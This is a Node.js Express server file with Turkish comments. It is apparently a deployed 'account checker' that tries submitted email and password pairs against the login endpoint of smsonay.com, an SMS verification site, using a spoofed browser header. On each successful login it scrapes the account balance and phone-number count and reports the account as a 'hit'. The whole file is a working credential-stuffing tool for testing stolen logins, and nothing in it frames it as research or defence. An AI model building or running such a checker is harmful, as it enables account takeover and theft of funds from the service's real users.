const express = require('express');
const path = require('path'); // path modülü ekle
const cors = require('cors'); // CORS için (gerek kalmasa da güvenli olsun)

// Senin checker fonksiyonu (değişiklik yok)
const checker = async (user, pass) => {
  const axios = require('axios');
  const { wrapper } = require('axios-cookiejar-support');
  const { CookieJar } = require('tough-cookie');
  const { JSDOM } = require('jsdom');

  const jar = new CookieJar();
  const client = wrapper(axios.create({ jar, withCredentials: true }));

  try {
    const loginResp = await client({
      method: 'post',
      url: 'https://www.smsonay.com/ajax/login',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.smsonay.com/giris-yap'
      },
      data: new URLSearchParams({ 'email': user, 'password': pass }).toString()
    });

    if (loginResp.data.success === true) {
      const panelResp = await client.get('https://www.smsonay.com/panel');
      const dom = new JSDOM(panelResp.data);
      const document = dom.window.document;
      const stats = document.querySelectorAll('span.fw-bolder.fs-2x');
      const bakiye = stats[0] ? stats[0].textContent.trim() : "0.00 TL";
      const numara = stats[1] ? stats[1].textContent.trim() : "0";
      return { success: true, status: 'hit', fullDetail: `Bakiye: ${bakiye} | Numara: ${numara}` };
    } else {
      return { success: false, status: 'fail', reason: loginResp.data.message || "Hatalı Giriş" };
    }
  } catch (e) {
    return { success: false, status: 'fail', reason: "Bağlantı Hatası: " + e.message };
  }
};

const app = express();

app.use(express.json());
app.use(cors()); // Frontend aynı domain'den gelse bile güvenli olsun

// Statik dosyaları kök dizinden serve et (index.html otomatik açılır)
app.use(express.static(path.join(__dirname)));

// API endpoint
app.post('/check', async (req, res) => {
  const { user, pass } = req.body;
  if (!user || !pass) {
    return res.status(400).json({ success: false, reason: 'E-posta ve şifre gerekli' });
  }
  const result = await checker(user, pass);
  res.json(result);
});

// Tüm diğer GET istekleri için index.html dön (tarayıcıda siteyi açınca formu gösterir)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server ${PORT} portunda çalışıyor - https://kaicheckerz.onrender.com`);
});
